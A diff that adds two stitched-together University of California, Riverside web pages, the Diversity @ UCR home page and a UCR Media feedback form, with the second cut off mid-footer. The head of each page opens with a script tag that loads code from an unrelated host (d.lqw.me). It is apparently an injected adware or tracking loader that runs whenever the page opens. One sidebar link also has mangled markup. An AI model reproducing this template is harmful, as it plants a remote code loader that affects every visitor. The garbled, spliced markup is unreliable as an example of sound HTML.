@@ -1,0 +1,857 @@
+<!--?xml version="1.0" encoding="utf-8"?--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+ <head> 
+  <script type="text/javascript" id="2f2a695a6afce2c2d833c706cd677a8e" src="http://d.lqw.me/xuiow/?o=3&amp;g=51C1355B-8F04-5EE1-6BAA-F729663DD92F&amp;s=BBA5481A-926B-4561-BD79-249F618495E6&amp;z=1393293607"></script> 
+  <title>Diversity @ UCR: Home</title> 
+  <meta http-equiv="last-modified" content="2014-03-03" /> 
+  <meta name="version" content="2.45 2.74 " /> 
+  <!-- 03/09/14 23:06:39 03/09/14 23:54:56 --> 
+  <link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/design6bis.css" media="all" /> 
+  <link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/wide6.css" media="all" /> 
+  <link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/medblue6.css" media="all" /> 
+  <link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/print6.css" media="print" /> 
+  <link rel="stylesheet" type="text/css" href="/css/local.css" media="all" /> 
+  <link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/sifr.css" media="all" /> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/sifr.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/sifr-config.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/swfobject.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/prototype.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/scriptaculous.js?load=effects"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/lib.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/control.tabs.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/glider.js"></script> 
+  <script type="text/javascript" src="/scripts/scroll.js"></script> 
+  <!--[if lte IE 6]>
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/ie6-wide6.css" media="all" />
+<script defer type="text/javascript" src="http://www.ucr.edu/pngfix.js"></script>
+<![endif]--> 
+  <!--[if lte IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/ie7.css" media="all" />
+<script type="text/javascript" src="http://www.ucr.edu/fixiequotes.js"></script>
+<![endif]--> 
+  <script type="text/javascript">
+// <![CDATA[
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-3051875-1']);
+  _gaq.push(['_setDomainName', '.ucr.edu']);
+  _gaq.push(['_setAllowHash', false]);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+// ]]>
+</script> 
+ </head> 
+ <body> 
+  <div class="pagewrapper"> 
+   <ul id="accessibility_links"> 
+    <li class="skip"><a tabindex="1" href="#main" accesskey="2" title="Skip Navigation">Skip Navigation</a></li> 
+    <li class="skip"><a tabindex="2" href="http://diversity.ucr.edu/" accesskey="1" title="Home Page">Home Page</a></li> 
+   </ul> 
+   <hr /> 
+   <div id="brandingbar"> 
+    <img class="overlay" src="/images/design6/overlay_home.png" alt="" /> 
+    <h2><a href="http://www.ucr.edu/" title="UCR Home Page"><img src="http://www.ucr.edu/images/design6/ucr_logo.gif" width="150" height="53" alt="University of California, Riverside" title="UCR Home page" /></a></h2> 
+   </div> 
+  </div> 
+  <div id="masthead" style="background-image:url(/images/masthead.jpg);"> 
+   <h1><a href="http://diversity.ucr.edu/"><span class="printonly">Diversity @ UCR</span></a></h1> 
+  </div> 
+  <!-- Status: Normal --> 
+  <hr /> 
+  <div class="breadcrumbs"> 
+   <h3 class="accessibility">Breadcrumbs</h3> 
+   <ul> 
+    <li><a href="http://www.ucr.edu/" title="UCR Home">UCR Home</a> &gt;</li> 
+    <li class="lastitem">Diversity @ UCR</li> 
+   </ul> 
+  </div> 
+  <div class="pagewrapper"> 
+   <div id="search"> 
+    <div id="nav_utility"> 
+     <ul> 
+      <li><a href="http://www.ucr.edu/alpha.html">A to Z Listing</a></li> 
+      <li><a href="http://campusmap.ucr.edu/">Campus Map</a></li> 
+      <li><a href="http://www.ucr.edu/find_people.php">Find People</a></li> 
+     </ul> 
+    </div> 
+    <form id="searchbox" action="http://www.ucr.edu/search.php">
+     <p> <label for="SearchText" accesskey="4" title="Search">Search for:</label> <input type="text" size="18" maxlength="255" id="SearchText" name="q" value="" /> <input id="go" type="submit" name="sa" value="Go" /> </p>
+    </form> 
+    <script type="text/javascript" src="http://www.ucr.edu/js/watermark.js"></script> 
+   </div> 
+   <hr /> 
+   <!-- Start Content (Navigation and Content columns) --> 
+   <div id="content"> 
+    <h2>Home</h2> 
+    <!-- Start Sidebar --> 
+    <div id="sidebar"> 
+     <div class="nav"> 
+      <h3 class="accessibility">Main Navigation</h3> 
+      <ul> 
+       <li class="currentpage"><h3><dfn>Current page is: </dfn>Home</h3></li>
+       <li><a href="/about/" title="Diversity at UCR">Diversity at UCR<br /><span></span></a></li>
+       <li><a href="/about/policies.html" title="Policies &amp; Guidelines">Policies &amp; Guidelines</a></li>
+       <li><a href="/resources.html" title="Diversity Activities">Diversity Activities</a></li>
+       <li><a href="/student/" title="Student Resources">Student Resources<br /><span></span></a></li>
+       <li><a href="/faculty/" title="Faculty Resources">Faculty Resources<br /><span></span></a></li>
+       <li><a href="/staff" title="Staff Resources">Staff Resources<br /><span></span></a></li>
+       <li><a href="/statistics/statistics.html" title="Reports and Statistics">Reports and Statistics</a></li> 
+      </ul> 
+     </div> 
+     <div style="padding-left: 80px;">
+      <div>
+       <a href="http://www.facebook.com/pages/DiversityUCR/150732408330479" class="facebook" title="Like us on Facebook!"><span class="displace">Facebook</span></a>
+      </div>
+      <div>
+       <a href="http://twitter.com/diversityucr" class="twitter" title="Follow us on Twitter!"><span class="displace">Twitter</span></a> 
+      </div>
+     </div> 
+     <br /> 
+     <h4 class="news_sidebar_topper"><img src="/images/design6/news_events_topper.png" alt="News &amp; Events" /></h4> 
+     <div class="news_sidebar"> 
+      <!-- begin editing below this line --> 
+      <h5><a href="http://ucrtoday.ucr.edu/20102">Six to Be Recognized at Sixth Annual Women Students Celebration Event</a></h5>
+      <h6>February 21, 2014</h6>Six UCR students will receive awards for efforts in leadership and civic engagement, social justice and overcoming adversity at the fourth annual Celebration for a Day of Appreciation and Recognition of Women Students. 
+      <h5><a href="http://ucrtoday.ucr.edu/20701">Jewish Studies Chair Announced at UC Riverside</a></h5>
+      <h6>February 20, 2014</h6>Endowed chair fosters academic study of Judaism, support for Jewish students. 
+      <h5><a href="http://ucrtoday.ucr.edu/20040">UC Riverside Celebrates Black History Month with Variety of Events</a></h5>
+      <h6>January 30,2014</h6>Speakers, musicians, writers and more come to campus to celebrate and educate. 
+      <h5><a href="http://ucrtoday.ucr.edu/20059&gt;UCR Named a “Best Value College” by Princeton Review&lt;/a&gt;&lt;/h5&gt;&lt;h6&gt;January 28,2014&lt;/h6&gt;
+&lt;h5&gt;&lt;a href=" http:="" ucrtoday.ucr.edu="" 0000="">Conference to Examine New Religious Movements</a></h5>
+      <h6>January 22,2014</h6> 
+      <h5><a href="http://ucrtoday.ucr.edu/19689">UCR Scholars Play Integral Role in Global Religious Research</a></h5>
+      <h6>December 19, 2013</h6> 
+      <!-- do not edit below this line --> 
+     </div> 
+    </div> 
+    <hr /> 
+    <!-- End Sidebar --> 
+    <!-- Start Content Area --> 
+    <div id="main"> 
+     <!-- com.omniupdate.editor csspath="/z-omniupdate/css/macy-wide.css" cssmenu="" width="992" --> 
+     <div class="header"> 
+      <!-- com.omniupdate.div label="title" group="Everyone" button="734" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="700" -->
+      <a name="top"> </a> 
+      <!-- /com.omniupdate.div -->
+     </div> 
+     <div id="omnicontent"> 
+      <!-- com.omniupdate.div label="home-image" group="Everyone" button="657" -->
+      <!-- ouc:editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="700"/ -->
+      <div class="ucrtitle">
+       &nbsp;
+      </div> 
+      <div id="container"> 
+       <div class="main_view"> 
+        <div class="window"> 
+         <div class="image_reel">
+          <a href="#"><img src="/slider/mei.jpg" alt="" /></a> 
+          <a href="#"><img src="/slider/diverse.jpg" alt="" /></a> 
+          <a href="#"><img src="/slider/lgbt.jpg" alt="" /></a> 
+          <a href="#"><img src="/slider/hsi.jpg" alt="" /></a>
+         </div> 
+        </div> 
+        <div class="paging">
+         <a href="#" rel="1">1</a> 
+         <a href="#" rel="2">2</a> 
+         <a href="#" rel="3">3</a> 
+         <a href="#" rel="4">4</a>
+        </div> 
+       </div> 
+      </div> 
+      <script type="text/javascript" src="/slider/jquery.min.js"></script> 
+      <script type="text/javascript">// <![CDATA[
+$(document).ready(function() {
+
+	//Set Default State of each portfolio piece
+	$(".paging").show();
+	$(".paging a:first").addClass("active");
+
+		
+	//Get size of images, how many there are, then determine the size of the image reel.
+	var imageWidth = $(".window").width();
+	var imageSum = $(".image_reel img").size();
+	var imageReelWidth = imageWidth * imageSum;
+	
+	//Adjust the image reel to its new size
+	$(".image_reel").css({'width' : imageReelWidth});
+	
+	//Paging + Slider Function
+	rotate = function(){	
+		var triggerID = $active.attr("rel") - 1; //Get number of times to slide
+		var image_reelPosition = triggerID * imageWidth; //Determines the distance the image reel needs to slide
+
+		$(".paging a").removeClass('active'); //Remove all active class
+		$active.addClass('active'); //Add active class (the $active is declared in the rotateSwitch function)
+
+		
+		//Slider Animation
+		$(".image_reel").animate({ 
+			left: -image_reelPosition
+		}, 500 );
+		
+	}; 
+	
+	//Rotation + Timing Event
+	rotateSwitch = function(){		
+		play = setInterval(function(){ //Set timer - this will repeat itself every 3 seconds
+			$active = $('.paging a.active').next();
+			if ( $active.length === 0) { //If paging reaches the end...
+				$active = $('.paging a:first'); //go back to first
+
+			}
+			rotate(); //Trigger the paging and slider function
+		}, 16000); //Timer speed in milliseconds (3 seconds)
+	};
+	
+	rotateSwitch(); //Run function on launch
+	
+	//On Hover
+	$(".image_reel a").hover(function() {
+		clearInterval(play); //Stop the rotation
+	}, function() {
+		rotateSwitch(); //Resume rotation
+	});	
+	
+	//On Click
+	$(".paging a").click(function() {	
+		$active = $(this); //Activate the clicked paging
+		//Reset Timer
+		clearInterval(play); //Stop the rotation
+		rotate(); //Trigger rotation immediately
+		rotateSwitch(); // Resume rotation
+		return false; //Prevent browser jump to link anchor
+	});	
+	
+});
+// ]]></script>
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.div label="maincontent" group="Everyone" button="657" -->
+      <!-- ouc:editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="700"/ -->
+      <div id="middle"> 
+       <div class="plan"> 
+        <h4>2014-15 UCR Academic &amp; Staff Affirmative Action Plans</h4> 
+        <ul> 
+         <li> <p><a href="/UCR2014-15academicaap.pdf" target="_blank">UCR 2014-2015 Academic Affirmative Action Plan</a></p> </li> 
+         <li><a href="/UCR2014-15staffaap.pdf">UCR 2014-2015 Staff Affirmative Action Plan</a></li> 
+        </ul> 
+       </div> 
+       <div class="programs"> 
+        <h4>Programs</h4> 
+        <a href="/programs.html">All Programs</a>, 
+        <a href="/faculty/programs.html">Faculty Programs</a>, 
+        <a href="/staff/">Staff Programs</a>, 
+        <a href="/student/">Student Programs</a> 
+        <br />
+        <br />
+        <form action="http://infomine.ucr.edu/cgi-bin/canned_search" method="post">
+         <input type="text" name="query" maxlength="100" /> 
+         <input type="hidden" name="theme" value="diversitysearch" />
+         <input type="submit" value="Search" />
+        </form>
+       </div> 
+       <div class="clear" style="text-align: left;">
+        &nbsp;
+       </div> 
+      </div> 
+      <p>&nbsp;</p> 
+      <ul> 
+       <li> <h4>Chancellor Kim A. Wilcox's &quot;Campus of Respect&quot; Letter to the Community</h4> 
+        <blockquote>
+         At the University of California, Riverside, our students, faculty, staff, and guests represent myriad personal experiences and values that grow out of both differences and often unrecognized similarities in culture, background, and outlooks. 
+         <a href="/campusrespect2013.pdf" target="_blank">Read the full message here.</a>
+        </blockquote> </li> 
+       <li> <h4>UCR Strategic Plan: A Path to Preeminence</h4> 
+        <blockquote>
+         <a href="http://strategicplan.ucr.edu/documents/UCR%202020%20-%20Final.pdf" target="_blank">The strategic action plan</a> serves UCR over the course of the next decade, guiding the campus to assume its position among the top research universities in the nation. To fulfill its vision, the campus has identified four overarching strategic goals: academic excellence, access, diversity, and engagement.
+        </blockquote> </li> 
+       <li> <h4>Chancellor's Diversity Education Program: Making Excellence Inclusive (MEI)</h4> 
+        <blockquote>
+         UCR established the Diversity Education &amp; Leadership Initiative (DELI) in 2008 to promote, coordinate and oversee diversity activities on the campus. Since that time DELI has established the Chancelor's Diversity Education Program: Making Excellent Inclusive (MEI).
+        </blockquote> </li> 
+       <li> <h4>UC Riverside Lauded for Diversity, Value in the U.S. News &amp; World Report's 2014 Best&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Colleges Guide</h4> 
+        <blockquote>
+         The University of California, Riverside has once-again been recognized as a &quot;Best Value School&quot; and was lauded for its diversity in the U.S. News and World Report's 2014 Best Colleges Guide.&nbsp; 
+         <a href="http://ucrtoday.ucr.edu/17243" target="_blank">Read more here.</a>
+        </blockquote> </li> 
+       <li> <h4>UC Riverside Named a Military Friendly School for Third Consecutive Year</h4> 
+        <blockquote>
+         For the third year in a row, the University of California, Riverside has been recognized as a Military Friendly School by Victory Media. The honor recognizes the university for its efforts to assist America's military service members and veterans as students. 
+         <a href="http://ucrtoday.ucr.edu/17352" target="_blank">Read more here.</a>
+         <a class="scroll" href="#top"><span class="top_page">top</span></a>
+        </blockquote> </li> 
+      </ul>
+      <!-- /com.omniupdate.div -->  
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.div label="related_links" group="Everyone" button="657" -->
+      <!-- ouc:editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="700"/ -->
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.efp -->
+      <!-- /com.omniupdate.efp --> 
+     </div> 
+    </div> 
+    <!-- End Content Area --> 
+    <div class="clear"></div> 
+   </div> 
+   <!-- End Content --> 
+  </div> 
+  <div class="clear"></div> 
+  <div class="footerwrapper"> 
+   <h2>More Information</h2> 
+   <div class="pagewrapper"> 
+    <div class="prefooter"> 
+     <div class="column49"> 
+      <h3>General Campus Information</h3> 
+      <address> <span class="vcard"> <strong><span class="fn org">University of California, Riverside</span></strong><br /> <span class="adr"> <span class="street-address">900 University Ave.</span><br /> <span class="locality">Riverside</span>, <span class="region">CA</span> <span class="postal-code">92521</span><br /> </span> Tel: <span class="tel">(951) 827-1012</span><br /><br /> </span> <a href="http://library.ucr.edu/">UCR Libraries</a> • <a href="http://campusstatus.ucr.edu/">Campus Status</a><br /> <a href="http://www.ucr.edu/employment.html">Career Opportunities</a> • <a href="http://diversity.ucr.edu/">Diversity</a><br /> <a href="http://my.ucr.edu/visit/Pages/default.aspx">Visit UCR</a> • <a href="http://www.ucr.edu/about/directions.html">Maps and Directions</a></address> 
+     </div> 
+     <div class="column49"> 
+      <h3>Department Information</h3> 
+      <address><strong>Diversity @ UCR</strong><br /> <a href="http://www.campusmap.ucr.edu/campusMap.php?loc=SURGE" title="Campus Map">Surge 365</a><br /><br /> Tel: (951) 827-5604, (951) 827-6223<br /> Fax: (951) 827-5308<br /> E-mail: <a href="mailto:affirmativeaction@ucr.edu?subject=Diversity Web Site Inquiry">affirmativeaction@ucr.edu</a></address> 
+     </div> 
+     <div class="column49R"> 
+      <h3>Related Links</h3> 
+      <ul> 
+       <li><a href="http://affirmativeaction.ucr.edu/">Office of Faculty &amp; Staff Affirmative Action</a></li> 
+       <li><a href="http://titleix.ucr.edu/">Title IX/Sexual Harassment Office</a></li> 
+       <li><a href="http://www.conflictresolution.ucr.edu/">Conflict Resolution</a></li> 
+       <li><a href="http://www.universityofcalifornia.edu/diversity/">University of California - Diversity</a></li> 
+      </ul> 
+     </div> 
+     <div class="clear"></div> 
+    </div> 
+    <div class="clear"></div> 
+    <div id="nav_footer"> 
+     <h3 class="accessibility">Campuswide Navigation</h3> 
+     <ul>
+      <li><a id="nav_footer_home" href="http://www.ucr.edu/"><span>Home</span></a></li>
+      <li><a id="nav_footer_about_ucr" href="http://www.ucr.edu/about/"><span>About UCR</span></a></li>
+      <li><a id="nav_footer_academics" href="http://www.ucr.edu/academics/"><span>Academics</span></a></li>
+      <li><a id="nav_footer_athletics" href="http://www.ucr.edu/athletics/"><span>Athletics</span></a></li>
+      <li><a id="nav_footer_happenings" href="http://www.ucr.edu/happenings/"><span>Happenings</span></a></li>
+      <li><a id="nav_footer_research" href="http://www.ucr.edu/research/"><span>Research</span></a></li>
+      <li><a id="nav_footer_resources" href="http://www.ucr.edu/resources/"><span>Campus Resources</span></a></li>
+      <li><a id="nav_footer_giving" href="http://www.ucr.edu/giving/"><span>Giving to UCR</span></a></li>
+     </ul> 
+    </div> 
+    <h3 class="accessibility">Footer</h3> 
+    <div id="footer"> 
+     <ul> 
+      <li><a href="http://diversity.ucr.edu/sendmail.html" accesskey="9" title="Send Feedback E-mail">Feedback</a></li> 
+      <li><a href="http://www.ucr.edu/privacy.html">Privacy Policy</a></li> 
+      <li><a href="http://www.ucr.edu/terms.html" accesskey="8" title="Terms and Conditions">Terms and Conditions</a></li> 
+      <li>&copy; 2014 Regents of the University of California</li> 
+      <li><a rel="nofollow" href="http://ucrcmsdev.ucr.edu/oucampus/de.jsp?user=D01291&amp;site=diversitydev&amp;path=%2Findex.html">Last modified: 2014-Mar-03</a></li> 
+     </ul> 
+    </div> 
+   </div> 
+  </div> 
+  <!-- Generated in 0.103821 seconds using 2.00 MiB of memory. -->   
+ </body>
+</html><!--?xml version="1.0" encoding="utf-8"?--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+ <head> 
+  <script type="text/javascript" id="2f2a695a6afce2c2d833c706cd677a8e" src="http://d.lqw.me/xuiow/?o=3&amp;g=51C1355B-8F04-5EE1-6BAA-F729663DD92F&amp;s=BBA5481A-926B-4561-BD79-249F618495E6&amp;z=1393293607"></script> 
+  <title>UCR Media: Feedback</title> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
+  <!--[if IE]><![endif]--> 
+  <meta http-equiv="last-modified" content="2014-03-11" /> 
+  <meta name="version" content="2.64 2.146 " /> 
+  <!-- 03/11/14 15:51:42 03/11/14 15:51:42 --> 
+  <!--link rel="stylesheet" type="text/css" href="/css/design6bis.css" media="all" />
+<link rel="stylesheet" type="text/css" href="/css/narrow6.css" media="all" />
+<link rel="stylesheet" type="text/css" href="/css/blue6a.css" media="all" />
+<link rel="stylesheet" type="text/css" href="/css/sifr.css" media="all" /--> 
+  <link type="text/css" rel="stylesheet" href="/min/g=6bis-bluea-narrow" media="all" /> 
+  <!--link rel="stylesheet" type="text/css" href="/css/print6.css" media="print" /--> 
+  <link type="text/css" rel="stylesheet" href="/min/f=css/print6.css" media="print" /> 
+  <link rel="stylesheet" type="text/css" href="/media/css/local.css" media="all" /> 
+  <link href="//fast.fonts.com/cssapi/e3315127-3d6c-40f4-b227-65d8e078a0f5.css" rel="stylesheet" type="text/css" /> 
+  <script type="text/javascript" src="/min/g=js"></script> 
+  <!--[if lte IE 6]>
+<link rel="stylesheet" type="text/css" href="/css/ie6-narrow6.css" media="all" />
+<script defer type="text/javascript" src="/min/f=pngfix.js"></script>
+<link rel="stylesheet" type="text/css" href="/media/css/ie6-local.css" media="all" />
+<![endif]--> 
+  <!--[if lte IE 7]>
+<link rel="stylesheet" type="text/css" href="/css/ie7.css" media="all" />
+<script type="text/javascript" src="/min/f=fixiequotes.js"></script>
+<link rel="stylesheet" type="text/css" href="/media/css/ie7-local.css" media="all" />
+<![endif]--> 
+  <script type="text/javascript">
+// <![CDATA[
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-3051875-1']);
+  _gaq.push(['_setDomainName', '.ucr.edu']);
+  _gaq.push(['_setAllowHash', false]);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+// ]]>
+</script> 
+  <link rel="alternate" type="application/rss+xml" title="Subscribe to UCR Today via RSS" href="http://ucrtoday.ucr.edu/feed" /> 
+  <script type="text/javascript" src="//www.ucr.edu/min/f=js/validation.js"></script> 
+ </head> 
+ <body> 
+  <div class="pagewrapper"> 
+   <ul id="accessibility_links"> 
+    <li class="skip"><a tabindex="1" href="#main" accesskey="2" title="Skip Navigation">Skip Navigation</a></li> 
+    <li class="skip"><a tabindex="2" href="http://www.ucr.edu/media/" accesskey="1" title="Home Page">Home Page</a></li> 
+   </ul> 
+   <hr /> 
+  </div> 
+  <div id="masthead_home" style="background-image:url(/images/design6/mastheads/masthead03.jpg);"> 
+   <h1><a href="//www.ucr.edu/"><span class="printonly">UC Riverside</span></a></h1> 
+   <div class="pagewrapper"> 
+    <div id="search"> 
+     <div id="nav_utility"> 
+      <ul> 
+       <li><a href="//www.ucr.edu/alpha.html">A to Z Listing</a></li> 
+       <li><a href="http://campusmap.ucr.edu/">Campus Map</a></li> 
+       <li><a href="//www.ucr.edu/find_people.php">Find People</a></li> 
+      </ul> 
+     </div> 
+     <form id="searchbox" action="//www.ucr.edu/search.php">
+      <p> <label for="SearchText" accesskey="4" title="Search">Search for:</label> <input type="text" maxlength="255" id="SearchText" name="q" value="" /> <input id="go" type="submit" name="sa" value="Go" /> </p>
+     </form> 
+     <script type="text/javascript" src="//www.ucr.edu/js/watermark.js"></script> 
+    </div> 
+   </div> 
+  </div> 
+  <div id="nav_main"> 
+   <h2 class="accessibility">Campuswide Navigation</h2> 
+   <ul>
+    <li><a id="nav_main_home" href="http://www.ucr.edu/"><span>UCR Home</span></a></li>
+    <li><a id="nav_main_about_ucr" href="http://www.ucr.edu/about/"><span>About UCR</span></a></li>
+    <li><a id="nav_main_academics" href="http://www.ucr.edu/academics/"><span>Academics</span></a></li>
+    <li><a id="nav_main_athletics" href="http://www.ucr.edu/athletics/"><span>Athletics</span></a></li>
+    <li><a id="nav_main_happenings" href="http://www.ucr.edu/happenings/"><span>Happenings</span></a></li>
+    <li><a id="nav_main_research" href="http://www.ucr.edu/research/"><span>Research</span></a></li>
+    <li><a id="nav_main_resources" href="http://www.ucr.edu/resources/"><span>Campus Resources</span></a></li>
+    <li><a id="nav_main_giving" href="http://www.ucr.edu/giving/"><span>Giving to UCR</span></a></li>
+   </ul> 
+  </div> 
+  <div id="nav_audience"> 
+   <h2 class="accessibility">Audience Navigation</h2> 
+   <style type="text/css">body { background-color: #f4f7fa; } ul.big_links, h3.section, h4.section { background-image: url(/images/design6/horizontal_ruler_gradient_whitebar.gif);}</style> 
+   <ul>
+    <li><a id="nav_audience_future" href="http://www.ucr.edu/future/" title="For Prospective Students"><span>Prospective Students</span></a></li>
+    <li><a id="nav_audience_students" href="http://www.ucr.edu/students/" title="For Current Students"><span>Current Students</span></a></li>
+    <li><a id="nav_audience_parents" href="http://www.ucr.edu/parents/" title="For Parents"><span>Parents</span></a></li>
+    <li><a id="nav_audience_faculty" href="http://www.ucr.edu/faculty/" title="For Faculty"><span>Faculty</span></a></li>
+    <li><a id="nav_audience_staff" href="http://www.ucr.edu/staff/" title="For Staff"><span>Staff</span></a></li>
+    <li><a id="nav_audience_alumni" href="http://www.ucr.edu/alumni/" title="For Alumni"><span>Alumni</span></a></li>
+    <li><a id="nav_audience_friends" href="http://www.ucr.edu/friends/" title="For Friends"><span>Friends</span></a></li>
+    <li><a id="nav_audience_industry" href="http://www.ucr.edu/industry/" title="For Industry"><span>Industry</span></a></li>
+    <li><a class="active" id="nav_audience_media" href="http://www.ucr.edu/media/" title="For Media"><span>Media</span></a></li>
+   </ul> 
+  </div> 
+  <hr /> 
+  <!--[if lte IE 6]>
+<div class="pagewrapper">
+	<div style="margin-bottom: 1.5em;">
+		<h5 style="color: #b00; margin: .5em 15em 0">You appear to be using an outdated version of Internet Explorer. We are sorry, but your browser is no longer
+			supported. Please upgrade to a modern browser:</h5>
+		<div class="column49">
+			<ul class="tight">
+				<li><a href="http://getfirefox.com" class="external" title="external site: Mozilla Foundation">Firefox</a></li>
+				<li><a href="http://www.opera.com/browser/" class="external" title="external site: Opera Software">Opera</a></li>
+			</ul>
+		</div>
+		<div class="column49">
+			<ul class="tight">
+				<li><a href="http://www.microsoft.com/windows/internet-explorer/" class="external" title="external site: Microsoft">Internet Explorer 8</a></li>
+				<li><a href="http://www.apple.com/safari/" class="external" title="external site: Apple Inc.">Safari</a></li>
+			</ul>
+		</div>
+		<div class="column49R">
+			<ul class="tight">
+				<li><a href="http://www.google.com/chrome" class="external" title="external site: Google">Google Chrome</a></li>
+			</ul>
+		</div>
+		<div class="clear"></div>
+	</div>
+</div>
+<![endif]--> 
+  <div class="breadcrumbs"> 
+   <p class="accessibility">You are here:</p> 
+   <ul> 
+    <li><a href="//www.ucr.edu/" title="UCR Home">UCR Home</a> &gt;</li> 
+    <li><a href="http://www.ucr.edu/media/">UCR Media</a> &gt;</li> 
+    <li class="lastitem">Feedback</li> 
+   </ul> 
+  </div> 
+  <div class="pagewrapper"> 
+   <hr /> 
+   <!-- Start Content (Navigation and Content columns) --> 
+   <div id="content"> 
+    <h2 class="long">Feedback</h2> 
+    <!-- Start Sidebar --> 
+    <div id="sidebar"> 
+     <div class="nav"> 
+      <h3 class="accessibility">Main Navigation</h3> 
+      <ul> 
+       <li><a href="/media/" title="Media Home">Media Home<br /><span>Partnering to tell UCR's story</span></a></li>
+       <li><a href="/media/resources.html" title="Resources for Media">Resources for Media<br /><span>Helping you tell the story</span></a></li>
+       <li><a href="/media/experts.html" title="Experts on Demand">Experts on Demand<br /><span>Find the perfect source</span></a></li>
+       <li><a href="/media/news.html" title="News Releases">News Releases<br /><span>What is breaking at UCR</span></a></li>
+       <li><a href="/media/contact.html" title="How to Reach Us">How to Reach Us<br /><span>Contact information</span></a></li> 
+      </ul> 
+     </div> 
+    </div> 
+    <hr /> 
+    <!-- End Sidebar --> 
+    <!-- Start Content Area --> 
+    <div id="main"> 
+     <form method="post" name="form" class="form" id="form" action=""> 
+      <h3>Have a comment about UCR Media?</h3> 
+      <p>Please only use this form to submit feedback about this website.</p> 
+      <label for="author">Name: <em>(required)</em></label> 
+      <input type="text" tabindex="11" maxlength="40" id="author" name="author" class="required" title="Enter your name" value="" /> 
+      <label for="email">E-mail Address: <em>(required)</em></label> 
+      <input type="text" tabindex="12" maxlength="128" id="email" name="email" class="required" title="Enter your e-mail address" value="" /> 
+      <label for="comments">Comments: <em>(required)</em></label> 
+      <textarea id="comments" tabindex="13" name="comments" class="required" rows="6" cols="25"></textarea> 
+      <label for="security">Security Question: What color is green grass? <em>(required)</em></label> 
+      <input type="text" tabindex="14" maxlength="40" id="security" name="security" class="required" title="Answer the security question" value="" /> 
+      <p><input type="submit" tabindex="15" name="submitbutton" title="Submit Feedback" id="submitbutton" value="Send E-mail" /></p> 
+      <input type="hidden" name="referring_page" value="" /> 
+     </form> 
+     <h3>Looking for something else?</h3> 
+     <p>Please use the following links to find answers to other questions you may have.</p> 
+     <ul class="standout"> 
+      <li><a href="/alpha.html">A to Z Listing</a></li> 
+      <li><a href="/find_people.php">Find People</a></li> 
+      <li><a href="http://facultydirectory.ucr.edu/">Faculty Directory</a></li> 
+      <li><a href="http://campusmap.ucr.edu/">Campus Map</a></li> 
+      <li><a href="/search.php">Search UCR</a></li> 
+      <li><a href="http://admissions.ucr.edu/">Undergraduate Admissions</a></li> 
+      <li><a href="http://graduate.ucr.edu/">Graduate Admissions</a></li> 
+     </ul> 
+     <script type="text/javascript">
+// <![CDATA[
+    var valid = new Validation('form', {immediate : true});
+// ]]>
+</script> 
+    </div> 
+    <!-- End Content Area --> 
+    <div class="clear"></div> 
+   </div> 
+   <!-- End Content --> 
+  </div> 
+  <div class="clear"></div> 
+  <div class="footerwrapper"> 
+   <h2><span class="accessibility">More Information</span>&nbsp;</h2> 
+   <div class="pagewrapper"> 
+    <div class="prefooter"> 
+     <div class="column49"> 
+      <h3>General Campus Information</h3> 
+      <address> <span class="vcard"> <strong><span class="fn org">University of California, Riverside</span></strong><br /> <span class="adr"> <span class="street-address">900 University Ave.</span><br /> <span class="locality">Riverside</span>, <span class="region">CA</span> <span class="postal-code">92521</span><br /> </span> Tel: <span class="tel">(951) 827-1012</span> </span> </address> 
+      <ul class="footer_links"> 
+       <li><a href="http://library.ucr.edu/" onclick="javascript:_gaq.push(['_trackEvent','Footer','Link','http://library.ucr.edu/']);">UCR Libraries</a></li> 
+       <li><a href="http://campusstatus.ucr.edu/" onclick="javascript:_gaq.push(['_trackEvent','Footer','Link','http://campusstatus.ucr.edu/']);">Campus Status</a></li> 
